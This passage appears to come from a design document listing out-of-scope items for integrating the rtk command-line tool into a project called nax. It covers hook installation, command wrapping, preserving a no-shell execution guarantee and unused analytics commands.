- **A second interceptor provider.** The schema admits one; widening it is cheap when a
  real second consumer exists.
- **Wrapping user-authored command strings** (`quality.commands.*`, `acceptance.command`).
  Dropped by R10 — a user who wants rtk there writes it into the command themselves.
- **`rtk init` / rtk's own hook installation.** nax calls rtk as a library-shaped CLI; it
  does not participate in rtk's hook-installation flow, and must not write to the user's
  agent settings files.
- **Rewriting `Exec`** (`src/tools/run-command-exec.ts`). Its no-shell guarantee is
  structurally enforced by a test that reads the file whole; routing it through a rewriter
  would weaken a deliberate security property for an unmeasured gain.
- **`rtk pipe`, `rtk learn`, `rtk discover`, `rtk gain`** and the rest of rtk's analytics
  surface. Only `rewrite`, `recall`, `--version` and the filtered command verbs are used.
